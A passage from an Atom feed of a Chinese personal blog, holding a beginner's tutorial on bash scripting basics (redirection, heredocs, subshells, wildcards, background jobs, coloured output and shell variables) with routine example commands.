<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偷得浮生半日闲</title>
  
  <subtitle>再偷浮生两吊钱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.xpshuai.cn/"/>
  <updated>2020-03-16T09:07:35.212Z</updated>
  <id>http://www.xpshuai.cn/</id>
  
  <author>
    <name>浮生</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>shell脚本基本知识</title>
    <link href="http://www.xpshuai.cn/shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <id>http://www.xpshuai.cn/shell脚本基本知识/</id>
    <published>2020-03-16T09:01:17.000Z</published>
    <updated>2020-03-16T09:07:35.212Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/shell脚本基本知识/title.jpg"></p><a id="more"></a><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li><p>自动批量系统初始化（update，软件安装，时区设置，安全策略…）</p></li><li><p>自动化批量软件部署程序（LAMP/LNMP/Apache/LVS/Nginx)</p></li><li><p>管理应用程序（KVM，集群管理扩容，MySQL， DELLR720批量RAID）</p></li><li><p>日志分析处理日志（PV,UV, 200,!200, top 100/ grep, awk）</p></li><li><p>自动化备份恢复程序(MySQL完全/增量备份 + Crond)</p></li><li><p>自动化管理程序(批量远程修改密码，软件升级，配置更新)</p></li><li><p>自动化信息采集及监控程序（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…）</p></li><li><p>配合zabbix信息采集（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…）</p></li><li><p>自动化扩容（增加云主机-&gt;部署应用）</p></li><li><p>Zabbix监控CPU 80% + 调用Python的api 对AWS/EC2，ESC(增加 /删除云主机)+ Shell 脚本（业务上线）</p></li></ul><blockquote><p>程序的组成： 逻辑 + 数据</p></blockquote><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h4 id="一-常识"><a href="#一-常识" class="headerlink" title="一.常识"></a>一.常识</h4><p><strong>1.输入输出重定向</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 文件描述符：0，1,2    (对应：进程输入的文件，进程输入的文件，进程打开错误的文件)</span></span><br><span class="line">0表示标准输入</span><br><span class="line">1表示标准输出</span><br><span class="line">2表示标准错误输出</span><br><span class="line"></span><br><span class="line"><span class="comment">## 输入输出重定向</span></span><br><span class="line"><span class="comment"># &gt;, &gt;&gt;</span></span><br><span class="line">&gt; 默认为标准输出重定向，与 1&gt; 相同</span><br><span class="line">2&gt;&amp;1 把标准错误输出 重定向到 标准输出.</span><br><span class="line">&amp;&gt;a.txt 把标准输出 和 标准错误输出 都重定向到文件中</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2&gt;, 2&gt;&gt;   错误输出最佳</span></span><br><span class="line"><span class="comment"># 2&gt;&gt;&amp;1, &amp;&gt;   描述符为2的内容输入到描述符为1的内容(&amp;&gt; 是混合输出)</span></span><br><span class="line">cat &lt; /etc/hosts  <span class="comment">#（没加任何参数） 和不加&lt;的机制不一样</span></span><br><span class="line">cat &lt; /etc/hosts &gt; <span class="built_in">test</span>/aaa.txt  <span class="comment"># 相当于copy文件内容</span></span><br><span class="line">cat &lt;&lt; EOF   <span class="comment"># 输入内容让cat来执行</span></span><br><span class="line">cat &lt;&lt;EOF &gt; file1   <span class="comment"># 把一会输入的文件放到文件里面去 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 混合重定向  输出到/dev/null就是什么都不显示到终端</span></span><br><span class="line">&amp;&gt; /dev/null</span><br></pre></td></tr></table></figure><p><strong>2.一些快捷键</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ^R   搜索历史命令</span></span><br><span class="line"><span class="comment"># ![number]      执行历史命令中编号为`number`的命令</span></span><br><span class="line"><span class="comment"># ! string       找到最近一个以指定str开头的命令, 如：!da  </span></span><br><span class="line"><span class="comment"># !!  上一个命令（在脚本中是不能手动按方向键的）</span></span><br><span class="line"><span class="comment"># !$  shell上一个命令的最后一个参数，</span></span><br><span class="line">比如：ls aaa/bb /etc/passwd,   再执行： head !$, 看到是的passwd的内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># ^D   退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^A   跳到最前</span></span><br><span class="line"><span class="comment"># ^E   跳到最后</span></span><br><span class="line"><span class="comment"># ^K   向后删除</span></span><br><span class="line"><span class="comment"># ^U   向前 删除</span></span><br><span class="line"><span class="comment"># ^Y   撤销</span></span><br><span class="line"><span class="comment"># ^L</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^S   锁屏暂停</span></span><br><span class="line"><span class="comment"># ^Q   恢复</span></span><br></pre></td></tr></table></figure><p><strong>3.在bash程序中嵌入一个python代码</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 第一行不是注释， 声明用哪个解释器 #!</span></span><br><span class="line"></span><br><span class="line">ping -c1 114.114.114.114 &amp;&amp; <span class="built_in">echo</span> <span class="string">"114.114.114.114 is up"</span> || <span class="built_in">echo</span> <span class="string">"114.114.114.114 id down"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;&lt;-DOF：EOF是开始结束的标识（小横杠代表以下按tab,下面的py代码可以不tab缩进), EOF是不成文的规范</span></span><br><span class="line"><span class="comment"># 整个程序还是使用bash解释器，只不过是中间"请来一个人 - python"</span></span><br><span class="line"><span class="comment"># 如下：</span></span><br><span class="line">/usr/bin/python3 &lt;&lt;-EOF</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"hello py"</span>)</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello bash"</span></span><br><span class="line"><span class="comment"># 在bash中调用 python： expect</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果在python中使用bash， 要调用os.system('系统命令')</span></span><br></pre></td></tr></table></figure><p>没有<code>-</code>的话，EOF作为结束符，前面不能有任何tab制表符。<br>有<code>-</code>的话，EOF作为结束符，前面可以有tab制表符,<code>容错</code>率更高一点。</p><p><strong>4.配合figlet打印菜单:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cat &lt;&lt;EOF</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">|                                         _          |</span><br><span class="line">|        _ __ ___   __ _ _ __ _   _  __ _| |         |</span><br><span class="line">|       | <span class="string">'_ \` _ \ / _\` | '</span>_ \| | ||/ _\` | |              |</span><br><span class="line">|       | | | | | | (_| | | | | |_| |(_| | |         |</span><br><span class="line">|       |_| |_| |_|\__,_|_||_|\__,_|\__,_|_|         |</span><br><span class="line">|                                                    |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p><strong>5.子shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/Desktop</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这种做法，在终端执行完毕之后，当前目录还是没有变，因为他是在subshell （子shell中执行的）</span></span><br><span class="line"><span class="comment"># 要想使得subshell中的生效，就要使用`.` 或者 `source`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####### 执行脚本</span></span><br><span class="line">./01.sh      <span class="comment"># 需要执行权限，在子shell中执行</span></span><br><span class="line">bash 01.sh   <span class="comment"># 不需要执行权限，在子shell中执行</span></span><br><span class="line"></span><br><span class="line">01.sh          <span class="comment"># 需要执行权限，在当前shell中执行</span></span><br><span class="line"><span class="built_in">source</span> 01.sh   <span class="comment"># 不需要执行权限，在当前shell中执行</span></span><br></pre></td></tr></table></figure><p><strong>6.shell元字符</strong></p><p>通配符, 注意<code>区分</code>与<code>正则</code>中的元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># * 任意多个字符     </span></span><br><span class="line">ls /etc/net*</span><br><span class="line"></span><br><span class="line"><span class="comment"># ? 任意一个字符     </span></span><br><span class="line">ls home/xp?</span><br><span class="line"></span><br><span class="line"><span class="comment"># [] 匹配括号内任意一个字符   </span></span><br><span class="line">[abc]</span><br><span class="line">[a-z]    </span><br><span class="line">[^a-zA-Z0-9]     <span class="comment"># ^取反    </span></span><br><span class="line">l[io]ve         </span><br><span class="line">l[^a-z]ve          </span><br><span class="line"></span><br><span class="line"><span class="comment"># ()  命令在子shell中执行     </span></span><br><span class="line">(<span class="built_in">umask</span> 077; touch test.txt)    <span class="comment"># 不影响创建文件的权限，当前shell的umask也没有改变   </span></span><br><span class="line"><span class="comment"># ----- 回顾，子shell： .test.sh,     source x.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#125;  集合     </span></span><br><span class="line">touch &#123;1..9&#125;   </span><br><span class="line">mkdir /home/&#123;111,222&#125;              </span><br><span class="line">mkdir -pv /home/&#123;333,&#123;aaa,bbb&#125;, 444&#125;</span><br><span class="line">cp -rv /etc/&#123;passwd, passwd.old&#125;    <span class="comment"># 前面的相同的路径可以写在一块，后面不同的&#123;&#125;起来</span></span><br><span class="line">cp -rv /etc/passwd&#123;,.old&#125;       <span class="comment"># 前面的相同的路径可以写在一块，后面不同的&#123;&#125;起来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \     转义符    让元字符回归本意      </span></span><br><span class="line"><span class="built_in">echo</span> \*     </span><br><span class="line"><span class="built_in">echo</span> \\     </span><br><span class="line"><span class="built_in">echo</span> \    <span class="comment">#后面紧跟回车，也就转义了回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 常规字符转变为特殊意义的：</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"a\tb\nc"</span></span><br></pre></td></tr></table></figure><p><strong>7.前台后台</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## &amp;  (关闭xshell，对应的任务也跟着停止)</span></span><br><span class="line">sh test.sh &amp;  </span><br><span class="line"></span><br><span class="line"><span class="comment">## nohub  </span></span><br><span class="line"><span class="comment">#任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入）,重定向标准输出和标准错误到nohup.out中</span></span><br><span class="line">nohup sh test.sh  </span><br><span class="line"></span><br><span class="line"><span class="comment">## 区分`nohub`与`&amp;`:</span></span><br><span class="line">1.&amp; 是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出</span><br><span class="line">2.nohub 退出终端之后该进程还是有的</span><br><span class="line"></span><br><span class="line"><span class="comment">## nohub与&amp;合体</span></span><br><span class="line"><span class="comment">#将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。</span></span><br><span class="line">nohup sh test.sh  &amp; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## screen   </span></span><br><span class="line">apt install screen   <span class="comment"># 安装</span></span><br><span class="line">`sleep 100000` <span class="comment"># 先执行,然后退出终端，</span></span><br><span class="line">`screen -list` <span class="comment"># 再次打开终端,指定这个命令，看到id</span></span><br><span class="line">`screen -r yourID` <span class="comment"># 然后输入这个命令,一切就回来了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## shell的会话作业机制</span></span><br><span class="line">ctrl +c <span class="comment"># 杀掉的是前台进程</span></span><br><span class="line"><span class="comment"># ^Z  放到后台， fg  调回来</span></span><br><span class="line"><span class="built_in">kill</span> %3  <span class="comment"># 给当前终端作业号为3的发信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## jobs 查看作业</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 管道  |</span></span><br><span class="line"><span class="comment"># tee 管道, -a 最佳</span></span><br><span class="line">date | tee -a date.txt   <span class="comment"># 输出到文件，同时截流（能在终端直观地看到）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 技巧: vim里面写脚本，可以按^Z暂停，到终端敲命令，让fg返回继续</span></span><br></pre></td></tr></table></figure><p><strong>8.命令排序</strong></p><ol><li><p><code>;</code>   不具备逻辑排序  （前面执行完毕就执行后面的，不管前面成功失败与否）</p></li><li><p><code>&amp;&amp;</code>  前面执行<code>成功</code>(即返回值$?为0)就执行后面的</p></li><li><p><code>||</code>   前面执行<code>失败</code>(即返回值$?为不为0)就执行后面的</p><p>相当于 if  else</p></li></ol><p><strong>9.echo颜色输出</strong></p><p>使用场景：给用户醒目提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 才可以</span></span><br><span class="line"><span class="comment"># \e[1;3x </span></span><br><span class="line"><span class="comment"># \e[1;3x   前景色(30-37),m后面是文字       </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;31mThis is a red"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33mThis is a yellow"</span></span><br><span class="line"><span class="comment"># 0m 恢复颜色</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"no color"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 常用： 前面变色之后，  后面紧跟：\e[0m 不变色(后面的内容就正常了)</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;31mThis is a red text. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"no color again"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 背景色(40-47)</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;41mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;42mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;43mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;44mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;45mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf     也是，不过是加了输出格式</span></span><br></pre></td></tr></table></figure><p><strong>10.切换用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换用户尽量加  -</span></span><br><span class="line">su - xxx   <span class="comment"># 加横线， shell的环境也跟随改变 （login shell） ； 执行的是前四个: bashrc和profile</span></span><br><span class="line">su xxx     <span class="comment"># 不加横线，当前环境还是当前的    ()             ； 执行的是两个bashrc文件</span></span><br></pre></td></tr></table></figure><p><strong>11.关于bash的文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 关于bash的文件：</span></span><br><span class="line"><span class="comment"># 系统级别    来到shell时候执行</span></span><br><span class="line">/etc/profile</span><br><span class="line">/etc/bashrc</span><br><span class="line"><span class="comment"># 用户级别    来到shell时候执行</span></span><br><span class="line">~/.bashrc</span><br><span class="line">~/.profile</span><br><span class="line"><span class="comment"># 离开shell时候执行</span></span><br><span class="line">~/.bash_logout</span><br><span class="line">~/.bash_history</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改用户的shell</span></span><br><span class="line">usermod -s /bin/bash xps    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两个</span></span><br><span class="line"><span class="comment"># login shell</span></span><br><span class="line"><span class="comment"># nologin shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line"><span class="comment"># /sbin/nologin</span></span><br></pre></td></tr></table></figure><p><strong>12.其他</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shift使位置参数向左移动，默认移动1位，可以使用shift2</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$#</span> -ne 0 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> sum+=<span class="variable">$i</span></span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line"><span class="comment"># shift 2</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$sum</span>"</span></span><br></pre></td></tr></table></figure><h4 id="二-变量"><a href="#二-变量" class="headerlink" title="二.变量"></a>二.变量</h4><h5 id="位置变量"><a href="#位置变量" class="headerlink" title="位置变量"></a>位置变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">脚本执行时，后面的第几个参数   <span class="variable">$1</span> 后面第一个参数      <span class="variable">$2</span>  <span class="variable">$3</span>    <span class="variable">$&#123;10&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 比如下面的例子;</span></span><br><span class="line"><span class="comment"># bash test.sh 111 222 333</span></span><br><span class="line">ping -c1 <span class="variable">$1</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]           <span class="comment"># 如果`上一条命令`返回值等于0(正常执行)   -eq</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span> is up"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span> is down"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h5 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$0</span>    <span class="comment"># 脚本名</span></span><br><span class="line">$*    <span class="comment"># 所有的参数</span></span><br><span class="line"><span class="variable">$@</span>    <span class="comment"># 所有的参数</span></span><br><span class="line"><span class="variable">$#</span>    <span class="comment"># 参数的个数</span></span><br><span class="line">$$    <span class="comment"># 当前进程的PID         echo $$</span></span><br><span class="line">$!    <span class="comment"># 上一个`后台`进程的PID</span></span><br><span class="line">$?    <span class="comment"># 上一个命令的返回值（0为成功）</span></span><br></pre></td></tr></table></figure><p>ping 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果用户没有加参数</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"usage: file `basename <span class="variable">$0</span>`  need parmter"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>如果是文件  -f</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  第一个参数如果不是文件</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"not a file"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># 第一个参数是文件，从中读取ip然后ping</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> `cat <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    ping -c1 ip $&gt;/dev/null</span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span>          </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># basename    始终显示路径最后一个文件</span></span><br><span class="line"><span class="comment"># dirname    始终显示路径前面目录的名字</span></span><br></pre></td></tr></table></figure><h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><p>export</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在系统配置中用的多</span></span><br><span class="line"><span class="comment"># 例如：自己添加环境变量：到/etc/profile</span></span><br><span class="line">PATH=<span class="variable">$PATH</span>:/new/bin</span><br><span class="line"><span class="built_in">export</span> PATH</span><br><span class="line"><span class="comment"># 然后sourcess</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> UID</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$USER</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$HISTORY</span>      <span class="comment">#历史记录命令默认记录1000条</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有的环境变量：   </span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消环境变量：   </span></span><br><span class="line"><span class="built_in">unset</span> 变量名</span><br></pre></td></tr></table></figure><h5 id="自定义变量"><a href="#自定义变量" class="headerlink" title="自定义变量"></a>自定义变量</h5><p>作用范围：<code>当前shell中</code>生效(<code>a.sh</code>或<code>bash a.sh</code>)， 子shell中不行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## 转为环境变量 export  (在一个脚本文件中export， 在另一个脚本中就可以获取了)</span></span><br><span class="line"><span class="built_in">export</span> ip1</span><br><span class="line"></span><br><span class="line"><span class="comment">## ps: 自己没必要定义环境变量</span></span><br><span class="line">F1: 先 .test.sh    再<span class="built_in">echo</span> <span class="variable">$ip1</span></span><br><span class="line">F2: 或者在一个脚本中引用加载另外一个脚本(./test.sh)，后面就可以用了（没必要在每个文件中都定义一遍变量）</span><br></pre></td></tr></table></figure><h5 id="变量的赋值"><a href="#变量的赋值" class="headerlink" title="变量的赋值"></a>变量的赋值</h5><p>1.显式赋值 （变量要以字母或者下划线开头，数字不可以开头）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 常规赋值</span></span><br><span class="line"><span class="comment"># shell中没有数据类型，都是字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 命令替换, 